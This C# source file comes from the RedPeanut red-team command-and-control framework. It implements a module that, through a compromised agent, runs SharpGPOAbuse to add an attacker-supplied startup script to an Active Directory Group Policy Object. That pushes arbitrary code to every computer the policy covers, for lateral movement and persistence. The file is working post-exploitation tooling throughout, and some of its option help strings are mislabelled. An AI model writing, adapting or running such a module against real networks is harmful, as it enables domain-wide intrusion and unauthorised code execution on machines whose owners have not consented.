//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class SharpGPOAddComputerScriptManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set domaincontroller", "Payload type to use" },
            { "set domain", "Injection type" },
            { "set gponame", "Process to spawn" },
            { "set force", "Process to spawn" },
            { "set scriptname", "Process to spawn" },
            { "set scriptcontents", "Process to spawn" },
            { "run", "Execute module" },
            { "options", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "addcomputerscript";
        string domainController;
        private string domain;
        private bool force;
        private string gpoName;
        private string scriptName;
        private string scriptContents;

        bool exit = false;

        public SharpGPOAddComputerScriptManager() {

        }

        public SharpGPOAddComputerScriptManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                GpoAbuseMenu(input);
            } while (!exit);
        }

        private void GpoAbuseMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set domaincontroller":
                            domainController = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "set gponame":
                            gpoName = GetParsedSetString(input);
                            break;
                       case "set force":
                            force = GetParsedSetBool(input);
                            break;
                        case "set scriptname":
                            scriptName = GetParsedSetString(input);
                            break;
                        case "set scriptcontents":
                            scriptContents = GetParsedSetStringMulti(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }

        private void Run()
        {
            if (!string.IsNullOrEmpty(gpoName) && !string.IsNullOrEmpty(scriptName) && !string.IsNullOrEmpty(scriptContents))
            {
                List<string> args = new List<string>();
                args.Add("--AddComputerTask");
                args.Add("--GPOName");
                args.Add(gpoName);
                args.Add("--ScriptName");
                args.Add(scriptName);
                args.Add("--ScriptContents");
                args.Add(scriptContents);

                if (!string.IsNullOrEmpty(domain))
                {
                    args.Add("--Domain");
                    args.Add(domain);
                }

                if (!string.IsNullOrEmpty(domainController))
                {
                    args.Add("--DomainController");
                    args.Add(domainController);
                }

                if (force)
                    args.Add("--Force");

                RunAssembly(PL_MODULE_SHARPGPOABUSE, "SharpGPOAbuse.Program", args.ToArray<string>(), agent);
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "domaincontroller", domainController },
                { "domain", domain },
                { "gponame", gpoName },
                { "force", force.ToString() },
                { "scriptname", scriptName },
                { "scriptcontents", scriptContents }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}

